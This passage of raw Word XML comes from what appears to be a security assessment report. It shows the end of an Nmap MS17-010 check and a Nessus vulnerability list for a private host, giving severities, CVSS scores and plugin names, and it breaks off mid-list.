        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|     References:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4025CE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F74A58" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39EBEB36" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAB36E8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05663648" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 1 IP address (1 host up) scanned in 193.41 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3D0D05" w14:textId="77777777" w:rsidR="002152BC" w:rsidRPr="002152BC" w:rsidRDefault="002152BC" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="-5"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc27518419"/>
      <w:r w:rsidRPr="002152BC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Nessus scan readout</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="6A2960BD" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Server Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50713064" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Report generated by Nessus™ Fri, 29 Nov 2019 11:11:44 GMT Standard Time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215A3E3A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>TABLE OF CONTENTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E11FF01" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Hosts Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33708B3A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>• 192.168.0.1...........................................................................................................................................................4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F99FCF1" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>• 192.168.0.2...........................................................................................................................................................8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5189B7B0" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Hosts Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B58CACF" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.1 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086921F2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444803FA" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>3 8 10 1 66</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CD571A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CRITICAL HIGH MEDIUM LOW INFO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75934CA5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Vulnerabilities Total: 88</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF04BBB" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>SEVERITY CVSS PLUGIN NAME</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53960D17" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CRITICAL 10.0 53514 MS11-030: Vulnerability in DNS Resolution Could Allow Remote Code Execution (2509553) (remote check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E81021F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CRITICAL 10.0 72836 MS11-058: Vulnerabilities in DNS Server Could Allow Remote Code Execution (2562485) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763B4623" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CRITICAL 10.0 58987 PHP Unsupported Version Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFE959D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 9.3 97833 MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (ETERNALBLUE) (ETERNALCHAMPION) (ETERNALROMANCE) (ETERNALSYNERGY) (WannaCry) (EternalRocks) (Petya) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BE8D43" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 9.3 130276 PHP &lt; 7.1.33 / 7.2.x &lt; 7.2.24 / 7.3.x &lt; 7.3.11 Remote Code Execution Vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703E2C63" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 8.5 119764 PHP 5.6.x &lt; 5.6.39 Multiple vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C39C548" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 42411 Microsoft Windows SMB Shares Unprivileged Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F52239C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 101525 PHP 5.6.x &lt; 5.6.31 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2D0A50" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 104631 PHP 5.6.x &lt; 5.6.32 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F1759C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 107216 PHP 5.6.x &lt; 5.6.34 Stack Buffer Overflow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61398D47" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>HIGH 7.5 121602 PHP 5.6.x &lt; 5.6.40 Multiple vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EDD20D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>MEDIUM 6.8 103876 Microsoft Windows SMB Server (2017-10) Multiple Vulnerabilities (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A04730" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 6.8 109576 PHP 5.6.x &lt; 5.6.36 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D7F00E" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.8 90510 MS16-047: Security Update for SAM and LSAD Remote Protocols (3148527) (Badlock) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B21070D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.8 42263 Unencrypted Telnet Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D185FE0" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.1 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2312A1" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.0 10073 Finger Recursive Request Arbitrary Site Redirection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8E86DF" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.0 11213 HTTP TRACE / TRACK Methods Allowed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D917CB" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.0 72837 MS12-017: Vulnerability in DNS Server Could Allow Denial of Service (2647170) (uncredentialed check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1472871D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 5.0 111230 PHP 5.6.x &lt; 5.6.37 exif_thumbnail_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>extract(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>) DoS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B61823" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 4.3 105771 PHP 5.6.x &lt; 5.6.33 Multiple Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC8BDD2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>MEDIUM 4.3 117497 PHP 5.6.x &lt; 5.6.38 Transfer-Encoding Parameter XSS Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C270997" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>LOW 1.9 122591 PHP 5.6.x &lt; 5.6.35 Security Bypass Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A7B9B4" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10114 ICMP Timestamp Request Remote Date Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8BEBAF" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 48204 Apache HTTP Server Version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDD6261" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 21745 Authentication Failure - Local Checks Not Run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0713F9DC" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 110385 Authentication Success Insufficient Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24651F80" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 45590 Common Platform Enumeration (CPE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56763C47" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10736 DCE Services Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F35446" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 11002 DNS Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F4CB28" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 72779 DNS Server Version Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0722B38C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 54615 Device Type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="594EB88E" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 35716 Ethernet Card Manufacturer Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0B105B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 86420 Ethernet MAC Addresses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7F34B3" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10107 HTTP Server Type and Version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E156F00" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 12053 Host Fully Qualified Domain Name (FQDN) Resolution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375020C7" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 24260 HyperText Transfer Protocol (HTTP) Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18063A9A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 43829 Kerberos Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4202E449" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 25701 LDAP Crafted Search Request Server Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03FCA328" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 20870 LDAP Server Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0BF8D2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>INFO N/A 53513 Link-Local Multicast Name Resolution (LLMNR) Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C55481B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>192.168.0.1 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBC405F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 72780 Microsoft DNS Server Version Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FE736C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>INFO N/A 10902 Microsoft Windows 'Administrators' Group User List</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9EDA44" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
